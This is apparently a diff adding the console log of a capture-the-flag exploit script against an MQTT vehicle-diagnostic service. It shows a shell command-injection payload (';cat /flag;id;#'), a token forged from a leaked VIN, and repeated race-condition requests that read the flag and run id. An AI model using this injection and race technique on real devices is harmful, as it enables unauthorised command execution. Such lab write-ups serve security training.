@@ -1,0 +1,29 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab/platform && timeout 100 python3 solve_mqtt.py env.xj.edisec.net 30953
+====================================================================
+ 注入载荷 payload = ';cat /flag;id;#'
+ 模式 mode = client   (server=本地假 broker, client=连远程 broker)
+====================================================================
+[*] 以 MQTT 客户端连接 env.xj.edisec.net:30953 ...
+[+] 已发 CONNECT
+[+] 已订阅 diag / diag/resp
+[+] 收到 SUBACK pid=1 rc=0x01
+[+] 泄漏 VIN   = b';cat /flag;id;#'
+[+] 推导 token = 054060a8  (hash: h=h*31+(signed char)c)
+[>] 步骤1 (合法 set_vin, 通过校验后 sleep 2s): {"auth": "054060a8", "cmd": "set_vin", "arg": "1234567890"}
+[<] diag : b'{"auth": "054060a8", "cmd": "set_vin", "arg": "1234567890"}'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag : b'{"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}'
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag : b'{"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}'
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag : b'{"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}'
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag : b'{"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}'
+[<] diag/resp : b'unknown_command'
+[<] diag/resp : b'ret: FLAG{XJ_MrpqTJhm63bmZ87L}uid=1001(ctf) gid=1001(ctf) groups=100 -n ;cat /flag;id;#>/mnt/VIN;cat /mnt/VIN'
+[!] 命中 flag: FLAG{XJ_MrpqTJhm63bmZ87L}
+====================================================================
+[+] EXPLOIT SUCCESS
